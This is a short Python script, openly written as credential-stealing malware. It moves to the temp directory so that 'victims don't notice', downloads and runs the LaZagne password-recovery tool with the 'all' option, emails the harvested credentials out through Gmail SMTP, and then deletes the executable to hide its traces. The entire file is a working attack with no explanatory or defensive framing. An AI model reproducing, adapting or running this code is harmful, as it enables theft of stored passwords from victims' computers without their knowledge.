import requests, platform, subprocess, smtplib, tempfile, os


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as file:
        file.write(get_response.content)


def send_email(sender_mail, reciever_mail, password, mail_content):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_mail, password)
    server.sendmail(from_addr=sender_mail, to_addrs=reciever_mail, msg=mail_content)
    server.quit()


os_name = platform.system()

# chancce working directory for victims don't notice th laZagne.exe file
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe')
result = subprocess.check_output('laZagne.exe all', shell=True)

print(result)

send_email('mail', 'mail', 'password', result)

#delete file when process over
os.remove('laZagne.exe')

